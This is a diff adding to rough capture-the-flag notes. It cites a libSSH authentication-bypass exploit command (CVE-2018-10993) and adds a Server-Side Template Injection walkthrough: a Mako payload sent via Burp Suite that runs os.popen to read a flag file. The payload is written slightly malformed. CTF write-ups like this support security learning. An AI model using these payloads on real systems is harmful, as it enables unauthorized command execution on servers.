@@ -12,5 +12,21 @@ after scanning we can use CVE-2018-10993 libSSH authentication bypass exploit
 cve-2018-10993.py ip -p port -31367 -c "cd ..;cat flag.txt"
 ctf
 
+shark
+
+Flag format: CTF{sha256}
+curl is a command-line tool for getting or sending data including files using URL syntaxi
+using curl we can find out that the website is uisng Werkzeug web application library
+we can use Server-Side Template Injection and send MAKO payload using burp suite
+
+name=<%
+<%
+import os
+x=os.popen('cat flag').read()
+%>
+${x}
+
+
+
 
 
